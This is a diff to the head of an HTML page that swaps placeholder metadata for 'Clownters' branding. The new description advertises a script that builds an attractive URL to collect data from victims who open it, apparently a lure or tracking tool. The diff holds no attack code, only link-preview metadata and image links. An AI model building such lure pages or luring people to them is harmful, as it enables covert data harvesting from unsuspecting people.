@@ -5,12 +5,12 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta http-equiv="X-UA-Compatible" content="ie=edge">
 <meta property="og:type" content="website">
-<meta property="og:title" content="a">
-<meta property="og:image" content="pic.jpg">
-<meta property="og:description" content="a">
-<meta property="og:url" content="a">
-<title>a</title>
-<link rel="icon" href="pic.jpg">
+<meta property="og:title" content="Clownters Organization">
+<meta property="og:image" content="https://user-images.githubusercontent.com/82988362/215275753-140fda88-c496-481b-add9-3c82968f6c4b.jpg">
+<meta property="og:description" content="@MIke90s15 - Script that creates an attractive URL with the aim of collecting data as soon as the victim accesses it">
+<meta property="og:url" content="https://clownters.com">
+<title>Clownters</title>
+<link rel="icon" href="https://raw.githubusercontent.com/mike90s15/cloud/main/Clownters/Imagens/IMG_20220225_170641_796.jpg">
 <style>
   body {
     background: #fff;
